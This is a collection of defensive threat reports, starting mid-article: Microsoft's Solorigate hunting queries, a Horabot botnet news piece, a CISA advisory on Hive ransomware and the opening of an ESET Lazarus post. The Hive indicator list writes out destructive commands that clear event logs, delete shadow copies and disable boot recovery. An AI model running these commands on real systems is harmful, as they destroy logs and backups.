This cross-domain visibility allows Microsoft 365 Defender to correlate signals and comprehensively resolve whole attack chains.
Security operations teams can then hunt using this rich threat data and gain insights for hardening networks from compromise.
Read: Using Microsoft 365 Defender to protect against Solorigate. 
Figure 8.
Microsoft Defender for Endpoint detections across the Solorigate attack chain Several Microsoft Defender for Endpoint capabilities are relevant to the Solorigate attack: Next generation protection Microsoft Defender Antivirus, the default antimalware solution on Windows 10, detects and blocks the malicious DLL and its behaviors.
It quarantines malware, even if the process is running. 
Detection for backdoored SolarWinds.Orion.Core.BusinessLayer.dll files: Trojan:MSIL/Solorigate.
BR!dha Detection for Cobalt Strike fragments in process memory and stops the process: Trojan:Win32/Solorigate.A!dha Behavior:Win32/Solorigate.A!dha Detection for the second-stage payload, a cobalt strike beacon that might connect to infinitysoftwares[.]com. 
Trojan:Win64/Solorigate.
SA!dha Detection for the PowerShell payload that grabs hashes and SolarWinds passwords from the database along with machine information: Trojan:PowerShell/Solorigate.
H!dha Figure 9.
Microsoft Defender for Endpoint prevented malicious binaries Endpoint detection and response (EDR) 
Alerts with the following titles in the Microsoft Defender Security Center and Microsoft 365 security center can indicate threat activity on your network: SolarWinds Malicious binaries associated with a supply chain attack SolarWinds Compromised binaries associated with a supply chain attack Network traffic to domains associated with a supply chain attack Alerts with the following titles in the Microsoft Defender Security Center and Microsoft 365 security center can indicate the possibility that the threat activity in this report occurred or might occur later.
These alerts can also be associated with other malicious threats. 
ADFS private key extraction attempt Masquerading Active Directory exploration tool Suspicious mailbox export or access modification Possible attempt to access ADFS key material Suspicious ADFS adapter process created Figure 10.
Microsoft Defender for Endpoint detections of suspicious LDAP query being launched and attempted ADFS private key extraction Figure 11.
Microsoft Defender for Endpoint alert description and recommended actions for possible attempt to access ADFS key material Our ability to deliver these protections through our security technologies is backed by our security experts who immediately investigated this attack and continue to look into the incident as it develops.
Careful monitoring by experts is critical in this case because we’re dealing with a highly motivated and highly sophisticated threat actor.
In the same way that our products integrate with each other to consolidate and correlate signals, security experts and threat researchers across Microsoft are working together to address this advanced attack and ensure our customers are protected. 
Threat analytics report We published a comprehensive threat analytics report on this incident.
Threat analytics reports provide technical information, detection details, and recommended mitigations designed to empower defenders to understand attacks, assess its impact, and review defenses. Figure 12.
Threat analytics report on the Solorigate attack Advanced hunting Microsoft 365 Defender and Microsoft Defender for Endpoint customers can run advanced hunting queries to hunt for similar TTPs used in this attack. 
Malicious DLLs loaded into memory To locate the presence or distribution of malicious DLLs loaded into memory, run the following query DeviceImageLoadEvents | where SHA1 in (“d130bd75645c2433f88ac03e73395fba172ef676″,”1acf3108bf1e376c8848fbb25dc87424f2c2a39c”,”e257236206e99f5a5c62035c9c59c57206728b28″,”6fdd82b7ca1c1f0ec67c05b36d14c9517065353b”,”2f1a5a7411d015d01aaee4535835400191645023″,”bcb5a4dcbc60d26a5f619518f2cfc1b4bb4e4387″,”16505d0b929d80ad1680f993c02954cfd3772207″,”d8938528d68aabe1e31df485eb3f75c8a925b5d9″,”395da6d4f3c890295f7584132ea73d759bd9d094″,”c8b7f28230ea8fbf441c64fdd3feeba88607069e”,”2841391dfbffa02341333dd34f5298071730366a”,”2546b0e82aecfe987c318c7ad1d00f9fa11cd305″,”e2152737bed988c0939c900037890d1244d9a30e”) or SHA256 in (“ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6″,”dab758bf98d9b36fa057a66cd0284737abf89857b73ca89280267ee7caf62f3b”,”eb6fab5a2964c5817fb239a7a5079cabca0a00464fb3e07155f28b0a57a2c0ed”,”ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c”,”019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134″,”c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77″,”0f5d7e6dfdd62c83eb096ba193b5ae394001bac036745495674156ead6557589″,”e0b9eda35f01c1540134aba9195e7e6393286dde3e001fce36fb661cc346b91d”,”20e35055113dac104d2bb02d4e7e33413fae0e5a426e0eea0dfd2c1dce692fd9″,”2b3445e42d64c85a5475bdbc88a50ba8c013febb53ea97119a11604b7595e53d”,”a3efbc07068606ba1c19a7ef21f4de15d15b41ef680832d7bcba485143668f2d”,”92bd1c3d2a11fc4aba2735d9547bd0261560fb20f36a0e7ca2f2d451f1b62690″,”a58d02465e26bdd3a839fd90e4b317eece431d28cab203bbdde569e11247d9e2″,”cc082d21b9e880ceb6c96db1c48a0375aaf06a5f444cb0144b70e01dc69048e6″) Malicious DLLs created in the system or locally To locate the presence or distribution of malicious DLLs created in the system or locally, run the following query DeviceFileEvents | where SHA1 in (“d130bd75645c2433f88ac03e73395fba172ef676″,”1acf3108bf1e376c8848fbb25dc87424f2c2a39c”,”e257236206e99f5a5c62035c9c59c57206728b28″,”6fdd82b7ca1c1f0ec67c05b36d14c9517065353b”,”2f1a5a7411d015d01aaee4535835400191645023″,”bcb5a4dcbc60d26a5f619518f2cfc1b4bb4e4387″,”16505d0b929d80ad1680f993c02954cfd3772207″,”d8938528d68aabe1e31df485eb3f75c8a925b5d9″,”395da6d4f3c890295f7584132ea73d759bd9d094″,”c8b7f28230ea8fbf441c64fdd3feeba88607069e”,”2841391dfbffa02341333dd34f5298071730366a”,”2546b0e82aecfe987c318c7ad1d00f9fa11cd305″,”e2152737bed988c0939c900037890d1244d9a30e”) or SHA256 in (“ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6″,”dab758bf98d9b36fa057a66cd0284737abf89857b73ca89280267ee7caf62f3b”,”eb6fab5a2964c5817fb239a7a5079cabca0a00464fb3e07155f28b0a57a2c0ed”,”ac1b2b89e60707a20e9eb1ca480bc3410ead40643b386d624c5d21b47c02917c”,”019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134″,”c09040d35630d75dfef0f804f320f8b3d16a481071076918e9b236a321c1ea77″,”0f5d7e6dfdd62c83eb096ba193b5ae394001bac036745495674156ead6557589″,”e0b9eda35f01c1540134aba9195e7e6393286dde3e001fce36fb661cc346b91d”,”20e35055113dac104d2bb02d4e7e33413fae0e5a426e0eea0dfd2c1dce692fd9″,”2b3445e42d64c85a5475bdbc88a50ba8c013febb53ea97119a11604b7595e53d”,”a3efbc07068606ba1c19a7ef21f4de15d15b41ef680832d7bcba485143668f2d”,”92bd1c3d2a11fc4aba2735d9547bd0261560fb20f36a0e7ca2f2d451f1b62690″,”a58d02465e26bdd3a839fd90e4b317eece431d28cab203bbdde569e11247d9e2″,”cc082d21b9e880ceb6c96db1c48a0375aaf06a5f444cb0144b70e01dc69048e6″) SolarWinds processes launching PowerShell with Base64 To locate SolarWinds processes spawning suspected Base64-encoded PowerShell commands, run the following query DeviceProcessEvents| where InitiatingProcessFileName =~ “SolarWinds.BusinessLayerHost.exe”| where FileName =~ “powershell.exe”// Extract base64 encoded string, ensure valid base64 length| extend base64_extracted = extract(‘([A-Za-z0-9+/]{20,}[=]{0,3})’, 1, ProcessCommandLine)| extend base64_extracted = substring(base64_extracted, 0, (strlen(base64_extracted) / 4) *
4)| extend base64_decoded = replace(@’\0′, ”, make_string(base64_decode_toarray(base64_extracted)))//| where notempty(base64_extracted) and base64_extracted matches regex ‘[A-Z]’ and base64_extracted matches regex ‘[0-9]’ SolarWinds processes launching CMD with echo To locate SolarWinds processes launching CMD with echo, run the following query DeviceProcessEvents| where InitiatingProcessFileName =~ “SolarWinds.BusinessLayerHost.exe”| where FileName == “cmd.exe” and ProcessCommandLine has “echo” C2 communications To locate DNS lookups to a malicious actor’s domain, run the following query DeviceEvents| where ActionType == “DnsQueryResponse” //DNS
Query Responseand AdditionalFields has “.avsvmcloud” To locate DNS lookups to a malicious actor’s domain, run the following query DeviceNetworkEvents| where RemoteUrl contains ‘avsvmcloud.com’| where InitiatingProcessFileName !
= “chrome.exe”| where InitiatingProcessFileName !
= “msedge.exe”| where InitiatingProcessFileName !
= “iexplore.exe”| where InitiatingProcessFileName !
= “firefox.exe”| where InitiatingProcessFileName !
= “opera.exe” Find SolarWinds Orion software in your enterprise To search for Threat and Vulnerability Management data to find SolarWinds Orion software organized by product name and ordered by how many devices the software is installed on, run the following query DeviceTvmSoftwareInventoryVulnerabilities| where SoftwareVendor == ‘solarwinds’| where SoftwareName startswith ‘orion’| summarize dcount(DeviceName) by SoftwareName| sort by dcount_DeviceName desc ADFS adapter process spawning DeviceProcessEvents| where InitiatingProcessFileName =~”Microsoft.
IdentityServer.
ServiceHost.exe”| where FileName in~(“werfault.exe”, “csc.exe”)| where ProcessCommandLine !contains (“nameId”) Appendix MITRE ATT&CK techniques observed This threat makes use of attacker techniques documented in the MITRE ATT&CK framework. 
Initial Access T1195.001 Supply Chain Compromise Execution T1072 Software Deployment Tools Command and Control T1071.004 Application Layer Protocol: DNS T1017.001 Application Layer Protocol: Web Protocols T1568.002
Dynamic Resolution: Domain Generation Algorithms T1132 Data Encoding Persistence T1078
Valid Accounts Defense Evasion T1480.001 Execution Guardrails: Environmental Keying T1562.001 Impair Defenses: Disable or Modify Tools Collection T1005 Data From Local System Additional malware discovered 
In an interesting turn of events, the investigation of the whole SolarWinds compromise led to the discovery of an additional malware that also affects the SolarWinds Orion product but has been determined to be likely unrelated to this compromise and used by a different threat actor.
The malware consists of a small persistence backdoor in the form of a DLL file named App_Web_logoimagehandler.ashx.b6031896.dll, which is programmed to allow remote code execution through SolarWinds web application server when installed in the folder “inetpub\SolarWinds\bin\”.
Unlike Solorigate, this malicious DLL does not have a digital signature, which suggests that this may be unrelated to the supply chain compromise. 
Nonetheless, the infected DLL contains just one method (named DynamicRun), that can receive a C# script from a web request, compile it on the fly, and execute it. Figure 13: Original DLL Figure 14: The malicious addition that calls the DynamicRun method This code provides an attacker the ability to send and execute any arbitrary C# program on the victim’s device.
Microsoft Defender Antivirus detects this compromised DLL as Trojan:MSIL/Solorigate.
G!dha. 
Talk to us Questions, concerns, or insights on this story?
Join discussions at the Microsoft 365 Defender tech community. 
Read all Microsoft security intelligence blog posts. 
Follow us on Twitter @MsftSecIntel. 
The post Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers appeared first on Microsoft Security. 
title: Horabot campaign targeted businesses for more than two years before finally being discovered url: https://www.itpro.com/security/horabot-campaign-targeted-businesses-for-more-than-two-years-before-finally-being-discovered Security researchers have issued a warning over a sophisticated malware botnet that has flown under the radar for more than two years.
Analysis by security firm Cisco Talos also found that organisations across “several business verticals” have been targeted by the botnet since November 2020.Dubbed ‘Horabot’, the botnet was spotted infecting devices with a banking trojan and spam tools to steal sensitive financial information and assume control of user email accounts to wage phishing attacks.
Users of email services such as Gmail, Yahoo, and Outlook, have been impacted by the botnet, with their accounts used to send malicious emails to contacts.
“Horabot enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox,” researchers said.
“The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.
It also steals one-time security codes or soft tokens from the victim’s online banking applications.
”According
to Talos, the botnet has specifically targeted Spanish-speaking users in the Americas, and could be based in Brazil.
Companies operating in the accounting, construction, engineering, and investment sectors are thought to have been particularly targeted by the botnet.
How does Horabot work?Technical analysis from Cisco Talos revealed that the campaign is a “multi-stage attack chain” beginning with an initial phishing email.
This then delivers a malicious payload via a PowerShell downloader script.
“When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance,” researchers said in a blog post.
“The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.
”This payload was found to create specially crafted Windows shortcut files that run during the startup process of a victims machine and force it to restart.
Upon reboot, these malicious files enable the attacker to further infect the device.
“After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server,” the blog post explained.
“One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine, and another is Horabot.”Analysis of the banking trojanAnalysis from Talos found that the banking trojan used in this campaign specifically targets the victim’s login credentials and financial information.
This trojan enables the attacker to monitor activity on a victim’s device by collecting system information such as hostnames, IPv4 addresses, OS version information, and insights on anti-virus software present on the machine.
Data gathered by the trojan is then extracted to an attacker-controlled server, researchers added.
“The reconnaissance data is exfiltrated to the attacker-controlled server through an HTTP POST request,” Talos explained “The banking trojan targets the victim’s sensitive information, such as login credentials and financial transaction security codes, and logs keystrokes and manipulates the victim machine’s clipboard data.
“The trojan also has anti-analysis and anti-detection capabilities to evade the sandbox and virtual environments.”The
second element of this botnet campaign involves the use of a spam tool, researchers explained.
This acts as a secondary payload during the attack and enables the threat actor to assume control of the victim’s email accounts.
“The spam tool is a 32-bit DLL written in Delphi and, when run on the victim’s machine, will attempt to compromise the victim’s login credentials for webmail services such as Yahoo, Gmail, and Hotmail,” Cisco analysts explained.
Once user credentials have been compromised, this tool takes “full control” of the account and begins creating and circulating spam emails to contacts found in the victim’s mailbox.
This spambot also displayed “information-stealing capabilities”, including the ability to log keystrokes, capture screenshots, and track mouse activity on an infected computer. 
title: #StopRansomware: Hive Ransomware url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-321a Summary Actions to Take Today to Mitigate Cyber Threats from Ransomware: •
Prioritize remediating known exploited vulnerabilities. 
• Enable and enforce multifactor authentication with strong passwords • Close unused ports and remove any application not deemed necessary for day-to-day operations. 
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors.
These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware.
Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. 
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), and the Department of Health and Human Services (HHS) are releasing this joint CSA to disseminate known Hive IOCs and TTPs identified through FBI investigations as recently as November 2022. 
FBI, CISA, and HHS encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents.
Victims of ransomware operations should report the incident to their local FBI field office or CISA. 
Download the PDF version of this report: pdf, 852.9 kb. 
For a downloadable copy of IOCs, see AA22-321A.stix (STIX, 43.6 kb). 
Technical Details Note: This advisory uses the MITRE ATT&CK:registered: for Enterprise framework, version 12.
See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. 
As of November 2022, Hive ransomware actors have victimized over 1,300 companies worldwide, receiving approximately US$100 million in ransom payments, according to FBI information.
Hive ransomware follows the ransomware-as-a-service (RaaS) model in which developers create, maintain, and update the malware, and affiliates conduct the ransomware attacks.
From June 2021 through at least November 2022, threat actors have used Hive ransomware to target a wide range of businesses and critical infrastructure sectors, including Government Facilities, Communications, Critical Manufacturing, Information Technology, and especially Healthcare and Public Health (HPH). 
The method of initial intrusion will depend on which affiliate targets the network.
Hive actors have gained initial access to victim networks by using single factor logins via Remote Desktop Protocol (RDP), virtual private networks (VPNs), and other remote network connection protocols [T1133].
In some cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to FortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) CVE-2020-12812.
This vulnerability enables a malicious cyber actor to log in without a prompt for the user’s second authentication factor (FortiToken) when the actor changes the case of the username. 
Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]: CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability After gaining access, Hive ransomware attempts to evade detention by executing processes to: Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562]. 
Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell
[T1059] [T1490]. 
Delete Windows event logs, specifically the System, Security and Application logs
[T1070]. 
Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [T1112]. 
Hive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz
[T1537].
In addition to its capabilities against the Microsoft Windows operating system, Hive ransomware has known variants for Linux, VMware ESXi, and FreeBSD. 
During the encryption process, a file named *.key (previously *.key.
*) is created in the root directory (C:\ or /root/).
Required for decryption, this key file only exists on the machine where it was created and cannot be reproduced.
The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered [T1486].
The ransom note contains a “sales department” .onion
link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files.
However, some victims reported receiving phone calls or emails from Hive actors directly to discuss payment. 
The ransom note also threatens victims that a public disclosure or leak site accessible on the TOR site, “HiveLeaks”, contains data exfiltrated from victim organizations who do not pay the ransom demand (see figure 1 below).
Additionally, Hive actors have used anonymous file sharing sites to disclose exfiltrated data (see table 1 below). 
Figure 1: Sample Hive Ransom Note Table 1: Anonymous File Sharing Sites Used to Disclose Data https://anonfiles[.]com https://mega[.]nz https://send.exploit[.]in https://ufile[.]io https://www.sendspace[.]com https://privatlab[.]net https://privatlab[.]com Once the victim organization contacts Hive actors on the live chat panel, Hive actors communicate the ransom amount and the payment deadline.
Hive actors negotiate ransom demands in U.S. dollars, with initial amounts ranging from several thousand to millions of dollars.
Hive actors demand payment in Bitcoin. 
Hive actors have been known to reinfect—with either Hive ransomware or another ransomware variant—the networks of victim organizations who have restored their network without making a ransom payment. 
Indicators of Compromise Threat actors have leveraged the following IOCs during Hive ransomware compromises.
Note: Some of these indicators are legitimate applications that Hive threat actors used to aid in further malicious exploitation.
FBI, CISA, and HHS recommend removing any application not deemed necessary for day-to-day operations.
See tables 2–3 below for IOCs obtained from FBI threat response investigations as recently as November 2022. 
Table 2: Known IOCs as of November 2022 Known IOCs - Files HOW_TO_DECRYPT.txt typically in directories with encrypted files *.key typically in the root directory, i.e., C:\ or /root hive.bat shadow.bat asq.r77vh0[.]pw - Server hosted malicious HTA file asq.d6shiiwz[.]pw - Server referenced in malicious regsvr32 execution asq.swhw71un[.]pw - Server hosted malicious HTA file asd.s7610rir[.]pw - Server hosted malicious HTA file Windows_x64_encrypt.dll Windows_x64_encrypt.exe Windows_x32_encrypt.dll Windows_x32_encrypt.exe Linux_encrypt Esxi_encrypt Known IOCs – Events System, Security and Application Windows event logs wiped Microsoft Windows Defender AntiSpyware Protection disabled Microsoft Windows Defender AntiVirus Protection disabled Volume shadow copies deleted Normal boot process prevented Known IOCs – Logged Processes wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application vssadmin.exe delete shadows /all
/quiet wmic.exe
SHADOWCOPY /nointeractive wmic.exe shadowcopy delete bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no Table 3:
Potential IOC IP Addresses as of November 2022 Note: Some of these observed IP addresses are more than a year old.
FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action like blocking. 
Potential IOC IP Addresses for Compromise or Exfil: 84.32.188[.]57 84.32.188[.]238 93.115.26[.]251 185.8.105[.]67 181.231.81[.]239 185.8.105[.]112 186.111.136[.]37 192.53.123[.]202 158.69.36[.]149 46.166.161[.]123 108.62.118[.]190 46.166.161[.]93 185.247.71[.]106 46.166.162[.]125 5.61.37[.]207 46.166.162[.]96 185.8.105[.]103 46.166.169[.]34 5.199.162[.]220 93.115.25[.]139 5.199.162[.]229 93.115.27[.]148 89.147.109[.]208 83.97.20[.]81 5.61.37[.]207 5.199.162[.]220 5.199.162[.]229; 46.166.161[.]93 46.166.161[.]123; 46.166.162[.]96 46.166.162[.]125 46.166.169[.]34 83.97.20[.]81 84.32.188[.]238 84.32.188[.]57 89.147.109[.]208 93.115.25[.]139; 93.115.26[.]251 93.115.27[.]148 108.62.118[.]190 158.69.36[.]149/span> 181.231.81[.]239 185.8.105[.]67 185.8.105[.]103 185.8.105[.]112 185.247.71[.]106 186.111.136[.]37 192.53.123[.]202 MITRE ATT&CK TECHNIQUES See table 4 for all referenced threat actor tactics and techniques listed in this advisory. 
Table 4: Hive Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use External Remote Services T1133 Hive actors gain access to victim networks by using single factor logins via RDP, VPN, and other remote network connection protocols. 
Exploit Public-Facing Application T1190 Hive actors gain access to victim network by exploiting the following Microsoft Exchange vulnerabilities: CVE-2021-34473, CVE-2021-34523, CVE-2021-31207, CVE-2021-42321. 
Phishing T1566.001 Hive actors gain access to victim networks by distributing phishing emails with malicious attachments. 
Execution Technique Title ID Use Command and Scripting Interpreter T1059 Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or PowerShell. 
Defense Evasion Technique Title ID Use Indicator Removal on Host T1070 Hive actors delete Windows event logs, specifically, the System, Security and Application logs. 
Modify Registry T1112 Hive actors set registry values for DisableAntiSpyware and DisableAntiVirus to 1. Impair Defenses T1562 Hive actors seek processes related to backups, antivirus/anti-spyware, and file copying and terminates those processes to facilitate file encryption. 
Exfiltration Technique Title ID Use Transfer Data to Cloud Account T1537 Hive actors exfiltrate data from victims, using a possible combination of Rclone and the cloud storage service Mega.nz. 
Impact Technique Title Use Data Encrypted for Impact T1486 Hive actors deploy a ransom note HOW_TO_DECRYPT.txt into each affected directory which states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered. 
Inhibit System Recovery T1490 Hive actors looks to stop the volume shadow copy services and remove all existing shadow copies via vssadmin via command line or PowerShell. 
Mitigations FBI, CISA, and HHS recommend organizations, particularly in the HPH sector, implement the following to limit potential adversarial use of common system and network discovery techniques and to reduce the risk of compromise by Hive ransomware: 
Verify Hive actors no longer have access to the network. 
Install updates for operating systems, software, and firmware as soon as they are released. 
Prioritize patching VPN servers, remote access software, virtual machine software, and known exploited vulnerabilities.
Consider leveraging a centralized patch management system to automate and expedite the process. 
Require phishing-resistant MFA for as many services as possible—particularly for webmail, VPNs, accounts that access critical systems, and privileged accounts that manage backups. 
If used, secure and monitor RDP. 
Limit access to resources over internal networks, especially by restricting RDP and using virtual desktop infrastructure. 
After assessing risks, if you deem RDP operationally necessary, restrict the originating sources and require MFA to mitigate credential theft and reuse. 
If RDP must be available externally, use a VPN, virtual desktop infrastructure, or other means to authenticate and secure the connection before allowing RDP to connect to internal devices. 
Monitor remote access/RDP logs, enforce account lockouts after a specified number of attempts to block brute force campaigns, log RDP login attempts, and disable unused remote access/RDP ports. 
Be sure to properly configure devices and enable security features. 
Disable ports and protocols not used for business purposes, such as RDP Port 3389/TCP. Maintain offline backups of data, and regularly maintain backup and restoration.
By instituting this practice, the organization ensures they will not be severely interrupted, and/or only have irretrievable data. 
Ensure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the entire organization’s data infrastructure.
Ensure your backup data is not already infected.
, Monitor cyber threat reporting regarding the publication of compromised VPN login credentials and change passwords/settings if applicable. 
Install and regularly update anti-virus or anti-malware software on all hosts. 
Enable PowerShell Logging including module logging, script block logging and transcription. 
Install an enhanced monitoring tool such as Sysmon from Microsoft for increased logging. 
Review the following additional resources. 
The joint advisory from Australia, Canada, New Zealand, the United Kingdom, and the United States on Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling. 
The Cybersecurity and Infrastructure Security Agency-Multi-State Information Sharing & Analysis Center Joint Ransomware Guide covers additional best practices and ways to prevent, protect, and respond to a ransomware attack. 
StopRansomware.gov is the U.S. Government’s official one-stop location for resources to tackle ransomware more effectively. 
If your organization is impacted by a ransomware incident, FBI, CISA, and HHS recommend the following actions. 
Isolate the infected system.
Remove the infected system from all networks, and disable the computer’s wireless, Bluetooth, and any other potential networking capabilities.
Ensure all shared and networked drives are disconnected. 
Turn off other computers and devices.
Power-off and segregate (i.e., remove from the network) the infected computer(s).
Power-off and segregate any other computers or devices that share a network with the infected computer(s) that have not been fully encrypted by ransomware.
If possible, collect and secure all infected and potentially infected computers and devices in a central location, making sure to clearly label any computers that have been encrypted.
Powering-off and segregating infected computers and computers that have not been fully encrypted may allow for the recovery of partially encrypted files by specialists. 
Secure your backups.
Ensure that your backup data is offline and secure.
If possible, scan your backup data with an antivirus program to check that it is free of malware. 
In addition, FBI, CISA, and HHS urge all organizations to apply the following recommendations to prepare for, mitigate/prevent, and respond to ransomware incidents. 
Preparing for Cyber Incidents Review the security posture of third-party vendors and those interconnected with your organization.
Ensure all connections between third-party vendors and outside software or hardware are monitored and reviewed for suspicious activity. 
Implement listing policies for applications and remote access that only allow systems to execute known and permitted programs under an established security policy. 
Document and monitor external remote connections.
Organizations should document approved solutions for remote management and maintenance, and immediately investigate if an unapproved solution is installed on a workstation. 
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (i.e., hard drive, storage device, the cloud). 
Identity and Access Management Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with National Institute of Standards and Technology (NIST) standards for developing and managing password policies. 
Use longer passwords consisting of at least 8 characters and no more than 64 characters in length. 
Store passwords in hashed format using industry-recognized password managers. 
Add password user “salts” to shared login credentials. Avoid reusing passwords. 
Implement multiple failed login attempt account lockouts. 
Disable password “hints.” 
Refrain from requiring password changes more frequently than once per year unless a password is known or suspected to be compromised. 
Note: NIST guidance suggests favoring longer passwords instead of requiring regular and frequent password resets.
Frequent password resets are more likely to result in users developing password “patterns” cyber criminals can easily decipher. 
Require administrator credentials to install software. 
Require phishing-resistant multifactor authentication for all services to the extent possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Review domain controllers, servers, workstations, and active directories for new and/or unrecognized accounts. 
Audit user accounts with administrative privileges and configure access controls according to the principle of least privilege. 
Implement time-based access for accounts set at the admin level and higher.
For example, the Just-in-Time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege (as well as the Zero Trust model).
This is a process where a network-wide policy is set in place to automatically disable admin accounts at the Active Directory level when the account is not in direct need.
Individual users may submit their requests through an automated process that grants them access to a specified system for a set timeframe when they need to support the completion of a certain task. 
Protective Controls and Architecture Segment networks to prevent the spread of ransomware.
Network segmentation can help prevent the spread of ransomware by controlling traffic flows between—and access to—various subnetworks and by restricting adversary lateral movement. Identify, detect, and investigate abnormal activity and potential traversal of the indicated ransomware with a networking monitoring tool.
To aid in detecting the ransomware, implement a tool that logs and reports all network traffic, including lateral movement activity on a network.
Endpoint detection and response (EDR) tools are particularly useful for detecting lateral connections as they have insight into common and uncommon network connections for each host. 
Install, regularly update, and enable real time detection for antivirus software on all hosts. 
Vulnerability and Configuration Management Consider adding an email banner to emails received from outside your organization. 
Disable command-line and scripting activities and permissions.
Privilege escalation and lateral movement often depend on software utilities running from the command line.
If threat actors are not able to run these tools, they will have difficulty escalating privileges and/or moving laterally. 
Ensure devices are properly configured and that security features are enabled. 
Restrict Server Message Block (SMB) Protocol within the network to only access necessary servers and remove or disable outdated versions of SMB (i.e., SMB version 1).
Threat actors use SMB to propagate malware across organizations. 
REFERENCES Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts. 
Resource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center (MS-ISAC) Joint Ransomware Guide. 
No-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment. 
INFORMATION REQUESTED The FBI, CISA, and HHS do not encourage paying a ransom to criminal actors.
Paying a ransom may embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities.
Paying the ransom also does not guarantee that a victim’s files will be recovered.
However, the FBI, CISA, and HHS understand that when businesses are faced with an inability to function, executives will evaluate all options to protect their shareholders, employees, and customers.
Regardless of whether you or your organization decide to pay the ransom, the FBI, CISA, and HHS urge you to promptly report ransomware incidents to your local FBI field office, or to CISA at report@cisa.gov or (888) 282-0870.
Doing so provides investigators with the critical information they need to track ransomware attackers, hold them accountable under US law, and prevent future attacks. 
The FBI may seek the following information that you determine you can legally share, including: Recovered executable files Live random access memory (RAM) capture Images of infected systems Malware samples IP addresses identified as malicious or suspicious Email addresses of the attackers A copy of the ransom note Ransom amount Bitcoin wallets used by the attackers Bitcoin wallets used to pay the ransom Post-incident forensic reports DISCLAIMER The information in this report is being provided “as is” for informational purposes only.
FBI, CISA, and HHS do not endorse any commercial product or service, including any subjects of analysis.
Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by FBI, CISA, or HHS. Revisions Initial Version: November 17, 2022 
title:
Linux malware strengthens links between Lazarus and the 3CX supply‑chain attack url: https://www.welivesecurity.com/2023/04/20/linux-malware-strengthens-links-lazarus-3cx-supply-chain-attack/ Similarities with newly discovered Linux malware used in Operation DreamJob corroborate the theory that the infamous North Korea-aligned group is behind the 3CX supply-chain attack ESET researchers have discovered a new Lazarus Operation DreamJob campaign targeting Linux users.
Operation DreamJob is the name for a series of campaigns where the group uses social engineering techniques to compromise its targets, with fake job offers as the lure.
In this case, we were able to reconstruct the full chain, from the ZIP file that delivers a fake HSBC job offer as a decoy, up until the final payload: the SimplexTea Linux backdoor distributed through an OpenDrive cloud storage account.
To our knowledge, this is the first public mention of this major North Korea-aligned threat actor using Linux malware as part of this operation. 
Additionally, this discovery helped us confirm with a high level of confidence that the recent 3CX supply-chain attack was in fact conducted by Lazarus – a link that was suspected from the very beginning and demonstrated by several security researchers since.
In this blogpost, we corroborate these findings and provide additional evidence about the connection between Lazarus and the 3CX supply-chain attack. 
